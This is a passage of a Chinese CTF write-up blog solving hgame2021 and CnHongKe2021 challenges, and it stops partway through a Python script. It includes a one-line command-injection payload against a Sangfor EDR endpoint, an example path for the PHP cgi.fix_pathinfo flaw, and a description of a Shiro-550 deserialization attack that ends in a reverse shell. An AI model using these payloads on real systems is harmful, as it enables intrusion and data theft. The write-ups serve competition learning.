又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目） </p><p>题目地址： <a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p><p>又到了写脚本环节，首先看下题目</p><img src="/article/hgame2021/image-20210206162112398.png" class="" title="image-20210206162112398" loading="lazy"><p>我大概是假的大学生</p><p>先找题目，全是ax+b的形式，那就挺好办的，找源码看看怎么取数字</p><img src="/article/hgame2021/image-20210206162233545.png" class="" title="image-20210206162233545" loading="lazy"><p>应该还是挺好取的，但是开始写脚本发现GET请求不到，应该是对接api的，果然在Sources里面找到了个<code>fuckmath.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataType</span><span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token literal-property property">xhrFields</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">withCredentials</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token literal-property property">crossDomain</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">answer</span><span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    <span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token literal-property property">xhrFields</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">withCredentials</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">crossDomain</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>应该是通过<code>./api/getStatus</code>检查做题情况，<code>./api/getQuestion</code>加载题目，<code>./api/verify</code>交答案，最后<code>./api/getFlag</code>拿flag</p><p>直接访问<code>./api/getFlag</code>看看？</p><img src="/article/hgame2021/image-20210206162746009.png" class="" title="image-20210206162746009" loading="lazy"><p>被骂了555…应该是检查session看做题情况，其他都访问一下看看</p><img src="/article/hgame2021/image-20210206162926231.png" class="" title="image-20210206162926231" loading="lazy"><img src="/article/hgame2021/image-20210206162952785.png" class="" title="image-20210206162952785" loading="lazy"><p>最后确认答案是<code>answer</code>，开始写脚本</p><img src="/article/hgame2021/image-20210206163154279.png" class="" title="image-20210206163154279" loading="lazy"><p>赶时间，没搞正则，凑合着用用吧，蹩脚编程勿喷2333</p><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/30 21:20@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> integrate<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span><span class="token comment"># print(requests.get(url))</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jifen</span><span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> integrate<span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> shangxian<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\"question\":\"&lt;math>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/math>\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;mrow>"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    xiaxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(xiaxian)</span>    shangxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/msubsup>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                           <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(shangxian)</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mi>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(a)</span>    b <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(b)</span>    ans <span class="token operator">=</span> jifen<span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    upans <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>upans<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(session.cookies)</span></code></pre><p>一 键 获 取 flag</p><img src="/article/hgame2021/image-20210206163540205.png" class="" title="image-20210206163540205" loading="lazy"><hr><h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><p>题目描述：</p><p> <strong>本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者</strong><br>Liki 日记：<br>2020年2月2日：<br>今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话<br><strong>“我最讨厌顺风车，我将带来我的愤怒”</strong><br>真是让人摸不着头脑……<br>我看不懂，但我大受震撼。 </p><p>题目描述： <a href="http://police.liki.link/">http://police.liki.link</a> </p><p>原因是web3能上车了2333</p><p>相同payload，改改host就行</p><img src="/article/hgame2021/QQ%E5%9B%BE%E7%89%8720210206163759.png" class="" title="QQ图片20210206163759" loading="lazy"><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>misc随缘做做了，一周三场比赛有点忙</p><hr><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>题目描述：</p><p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09<br><strong>本次比赛为招新赛，请各位选手不要在当周比赛进行期间至结束后24小时内发布当周比赛题目的writeup</strong> </p><p>题目地址：<a href="https://www.baidu.com/">https://www.baidu.com</a> 很强啊</p><p>base64+base32+base16 不解释</p><hr><p>吐槽下MISC2</p><p>压缩包密码知道是啥嘛？</p><img src="/article/hgame2021/1.jpg" class="" width="1" loading="lazy"><p>23333没错就是的</p><p>misc3好像是流量包，能提出来一张几M的图片，分析图片</p><hr><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>题目描述： timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？ </p><p>题目链接：<a href="https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip">https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip</a></p><p>其实我以前出过一个Word的Misc，有人记得嘛2333</p><p>两个word文档，先看属性</p><img src="/article/hgame2021/image-20210206164905132.png" class="" title="image-20210206164905132" loading="lazy"><p>估计另一个有密码，直接以压缩包形式打开</p><p>很轻易有个<code>word/password.xml</code></p><img src="/article/hgame2021/image-20210206165015840.png" class="" title="image-20210206165015840" loading="lazy"><pre class="language-none"><code class="language-none">&lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;&#x2F;password&gt;</code></pre><p>很显然brainfuck</p><p>解密网站<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>解得<code>DOYOUKNOWHIDDEN?</code></p><p>开第二个文档，分析了一下什么都没有，文档只有一张图片</p><img src="/article/hgame2021/image-20210206165425076.png" class="" title="image-20210206165425076" loading="lazy"><p>选中文档发现不对劲，显示隐藏标记发现有隐藏字符，把字符取消隐藏</p><img src="/article/hgame2021/image-20210206170404252.png" class="" title="image-20210206170404252" loading="lazy"><p>发现是空白的，单独保存下来</p><img src="/article/hgame2021/image-20210206170505833.png" class="" title="image-20210206170505833" loading="lazy"><p>结合图片跟雪有关，可能是snow加密，去跑一下试试</p><img src="/article/hgame2021/image-20210206170631851.png" class="" title="image-20210206170631851" loading="lazy"><p>确实</p><hr><p>其他题目可以等官方或者PWN师傅的WP啦，每次做题不管简单还是困难都要有所收获，week2师傅们也要加油！提前祝师傅们新年快乐！</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CnHongKe2021公测赛</title>
      <link href="article/2021gongcesai/"/>
      <url>article/2021gongcesai/</url>
      
        <content type="html"><![CDATA[<p>2月5日</p><p>比赛情况：</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank" loading="lazy"><p>小比赛</p><span id="more"></span><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank" loading="lazy"><p>主办方平台关太快了2333，睡了一觉起来连平台都没了</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGI解析漏洞出现的原因是（ ）</p><ul><li><p>A.cgi.fix_pathi配置错误</p></li><li><p>B.cgi.fix_pathinfo配置错误</p></li><li><p>C.phpinfo配置错误</p></li><li><p>D.cgi.fix__status_en配置错误</p></li></ul><p>很显然是<code>cgi.fix_pathinfo</code>配置错误，当设置了cgi.fix_pathinfo &#x3D; 1时，PHP就会以’&#x2F;‘为分割符从最后一个文件开始向前找存在的文件去执行，例如<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h3><p>扫码得flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695" loading="lazy"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>深信服载入史册</p><p>直接payload打</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>这题去年有过，是作为线下赛的题目，当时没外网，只能硬审，或者…<del>记得payload</del>，毕竟太有名了…</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMe反序列化漏洞（Shiro-550）</p><p>用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033" loading="lazy"><p>可以如 <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">参考文章</a> 所示，利用<code>shiro.py</code>生成payload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419" loading="lazy"><p>当然后来才发现更简单的，直接用 <code>ShiroScan</code> 工具，可以用DNSlog的方式，也可以反弹shell，这里直接反弹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119" loading="lazy"><p>成功弹到shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988" loading="lazy"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>老脚本大师了</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967" loading="lazy"><p>写个py脚本即可，直接上payload，蹩脚编程，师傅们见谅…</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/5 9:22@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------取字符串"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token 